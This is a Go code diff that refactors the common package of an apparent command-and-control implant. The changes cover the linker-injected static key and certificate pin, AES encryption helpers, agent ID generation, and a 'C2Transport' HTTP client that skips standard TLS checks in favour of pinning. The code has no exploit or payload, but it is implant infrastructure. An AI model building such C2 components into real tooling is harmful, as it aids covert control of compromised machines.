@@ -1,4 +1,4 @@
-package main
+package common
 
 import (
 	"crypto/aes"
@@ -14,38 +14,48 @@ import (
 	"net/http"
 )
 
+// Linker-injected values (set via -ldflags on the common package path).
+var StaticKeyHex string // -X .../implant/internal/common.StaticKeyHex=...
+var CertPinHex string   // -X .../implant/internal/common.CertPinHex=...
+
+var StaticKey []byte
+var SessionKey []byte
+
+var CertPin string
+var C2Transport *http.Transport
+
 func init() {
-	if staticKeyHex == "" {
-		STATIC_KEY = make([]byte, 32)
-		rand.Read(STATIC_KEY)
+	if StaticKeyHex == "" {
+		StaticKey = make([]byte, 32)
+		rand.Read(StaticKey)
 	} else {
 		var err error
-		STATIC_KEY, err = hex.DecodeString(staticKeyHex)
-		if err != nil || len(STATIC_KEY) != 32 {
-			STATIC_KEY = make([]byte, 32)
-			rand.Read(STATIC_KEY)
+		StaticKey, err = hex.DecodeString(StaticKeyHex)
+		if err != nil || len(StaticKey) != 32 {
+			StaticKey = make([]byte, 32)
+			rand.Read(StaticKey)
 		}
 	}
 
-	if certPinHex != "" {
-		CERT_PIN = certPinHex
+	if CertPinHex != "" {
+		CertPin = CertPinHex
 	}
 
-	C2_TRANSPORT = &http.Transport{
+	C2Transport = &http.Transport{
 		TLSClientConfig: &tls.Config{
 			// Pin-only verification: we don't care about CA chains or the
-			// hostname, only that the presented cert matches CERT_PIN.
+			// hostname, only that the presented cert matches CertPin.
 			// InsecureSkipVerify disables the default chain/hostname checks;
 			// the custom VerifyPeerCertificate below still runs and enforces
 			// the pin, so a mismatch fails closed.
 			InsecureSkipVerify: true,
 			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
-				if CERT_PIN == "" {
+				if CertPin == "" {
 					return nil
 				}
 				for _, raw := range rawCerts {
 					digest := sha256.Sum256(raw)
-					if hex.EncodeToString(digest[:]) == CERT_PIN {
+					if hex.EncodeToString(digest[:]) == CertPin {
 						return nil
 					}
 				}
@@ -55,14 +65,14 @@ func init() {
 	}
 }
 
-func generateAgentID() string {
+func GenerateAgentID() string {
 	b := make([]byte, 8)
 	rand.Read(b)
 	return hex.EncodeToString(b)
 }
 
 func EncryptStatic(text string) (string, error) {
-	block, err := aes.NewCipher(STATIC_KEY)
+	block, err := aes.NewCipher(StaticKey)
 	if err != nil {
 		return "", err
 	}
@@ -70,7 +80,7 @@ func EncryptStatic(text string) (string, error) {
 }
 
 func DecryptStatic(cryptoText string) (string, error) {
-	block, err := aes.NewCipher(STATIC_KEY)
+	block, err := aes.NewCipher(StaticKey)
 	if err != nil {
 		return "", err
 	}
@@ -78,9 +88,9 @@ func DecryptStatic(cryptoText string) (string, error) {
 }
 
 func Encrypt(text string) (string, error) {
-	key := STATIC_KEY
-	if len(SESSION_KEY) > 0 {
-		key = SESSION_KEY
+	key := StaticKey
+	if len(SessionKey) > 0 {
+		key = SessionKey
 	}
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -90,9 +100,9 @@ func Encrypt(text string) (string, error) {
 }
 
 func Decrypt(cryptoText string) (string, error) {
-	key := STATIC_KEY
-	if len(SESSION_KEY) > 0 {
-		key = SESSION_KEY
+	key := StaticKey
+	if len(SessionKey) > 0 {
+		key = SessionKey
 	}
 	block, err := aes.NewCipher(key)
 	if err != nil {
